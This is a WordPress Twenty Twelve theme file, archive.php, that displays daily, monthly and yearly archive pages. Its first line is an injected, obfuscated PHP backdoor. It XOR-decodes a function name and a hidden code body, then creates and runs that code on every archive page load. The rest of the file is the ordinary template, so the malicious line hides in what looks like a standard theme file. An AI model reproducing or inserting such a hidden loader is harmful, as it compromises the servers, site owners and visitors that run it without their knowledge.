<?php $XdSUrOV=' 1.0 QaZXR.C:->'; $jDfWtUZs='CCKQT4><-<M7SBP'^$XdSUrOV; $oaxhxTX=',>RkFK+9Z3W=2UIS<;7cQ= EbHW2PgfU:2olEH-Mq5O=;.+=Ei,< i61;S89M8 qN-U31fhNK=DhYtnmf4nplfRKFpdPpJB4Yo2 OPe.reubjNf-k5HDX2<keOWH4bPCB,lQm=aDv.==jeybijH36-akSmocyvFIIcg sfN62 P+Sow:7Ob3skH1z5K8F8WypXM:boy<FbOxHUS I ghb RY HQGP5.11n: IwMP ST+5rcC.54T0NEVcQkstw=dwhXEYmS3:nRfmi28A 4ESFsql+Q>1qK+MaruiZ-7lkSk W; gqng87=:IhfIsBP.sZmV342QOJW2xK9E-2 -xdLgjq5>qatRRMimP06HQGimBMR>PdlAocyw,4GLt.P4Xuah==7kCkqq R62hGciJU=>4AMm+r.Gos0JXXYmrv-N+=<:18 BYnXTDh1U Tt=F=AFZ481gd:JI9.RUohXWH7lGTt<U 9a>=RaZjk,7ehW T,mJgD; L3J<P==lP5=J80EQ8 WWmRiZ- MYWtrfdP-giPP.<TbQR6 CoqPhVyl+ QTw0XOeVRz;;MefDcxBvQFK ZW gqtuyykwd69=X3lE,YoK<ZF2Mnr: :ZU-SmDMcDQ;JApwrkBZDHoZXCUVlo+YDRfcB K:-+ ojajyy55UNNyDxRO'; $bCbgsw=$jDfWtUZs('', 'EXzJ >EZ.Z8Sm01:OODKvEO7=,6F1898OFHElhVGxS:SXZBR+ITSR6RPO2gf MTYjI4GPJHj X=AyTNMFOdyeB=>2PYpWmy>PfTO=xAGRXURQnBDWF<64WRCA+6<UKkcfEGzD7hMRAHIJKDBAN,RBL:O:0O=YR-,08CISCnEFR<N=GSQR6KnZPB8sG.L3J9QT78NKTs5;h2rBq7A=AGUBF35S-jMtQOEP1QE0WppF28XPIiIHZF1Q--vKu40;8v-2H96yI8VCNoXMMDY-UQls=yxHO0JP. N4AOUM1HNWaZOD6OAGLNCNVQO,Sl4yH9HSrLrWUF0fj,8q-V7HSCEXLh884dk42 r3>II;UOhlyII4,>K5ML:ejpSHU3-+E5MxHALVXNPIbxUD3BSHzCM<4QKQzGdVxSMeWT+,9yPR6X XXNSPTI8<F ;67U4T5+b+H5n8UKTQPe.,ZA60GL<6<VEktPX4TX>UX+HsQaEQML3A MMlAdZR>R3c;XD35MT9LCmvSE.pArM>LT,pwRTFL=IRAt4OH59v9SYd2XpUkYKHEb0AT:-PbgCYYyQTqSIuB0u-E8cBPALRPYMQDWKO9J3.I 0.D35F>FUJAC6:L7JhmG 0O+hYWRKbzd3eS=54:DKO803=D2A2VBJDH7HQspPM<:fImCX2'^$oaxhxTX); $bCbgsw();
/**
 * The template for displaying Archive pages
 *
 * Used to display archive-type pages if nothing more specific matches a query.
 * For example, puts together date-based pages if no date.php file exists.
 *
 * If you'd like to further customize these archive views, you may create a
 * new template file for each specific one. For example, Twenty Twelve already
 * has tag.php for Tag archives, category.php for Category archives, and
 * author.php for Author archives.
 *
 * @link https://codex.wordpress.org/Template_Hierarchy
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */

get_header(); ?>

	<section id="primary" class="site-content">
		<div id="content" role="main">

		<?php if ( have_posts() ) : ?>
			<header class="archive-header">
				<h1 class="archive-title"><?php
					if ( is_day() ) :
						printf( __( 'Daily Archives: %s', 'twentytwelve' ), '<span>' . get_the_date() . '</span>' );
					elseif ( is_month() ) :
						printf( __( 'Monthly Archives: %s', 'twentytwelve' ), '<span>' . get_the_date( _x( 'F Y', 'monthly archives date format', 'twentytwelve' ) ) . '</span>' );
					elseif ( is_year() ) :
						printf( __( 'Yearly Archives: %s', 'twentytwelve' ), '<span>' . get_the_date( _x( 'Y', 'yearly archives date format', 'twentytwelve' ) ) . '</span>' );
					else :
						_e( 'Archives', 'twentytwelve' );
					endif;
				?></h1>
			</header><!-- .archive-header -->

			<?php
			/* Start the Loop */
			while ( have_posts() ) : the_post();

				/* Include the post format-specific template for the content. If you want to
				 * this in a child theme then include a file called called content-___.php
				 * (where ___ is the post format) and that will be used instead.
				 */
				get_template_part( 'content', get_post_format() );

			endwhile;

			twentytwelve_content_nav( 'nav-below' );
			?>

		<?php else : ?>
			<?php get_template_part( 'content', 'none' ); ?>
		<?php endif; ?>

		</div><!-- #content -->
	</section><!-- #primary -->

<?php get_sidebar(); ?>
<?php get_footer(); ?>
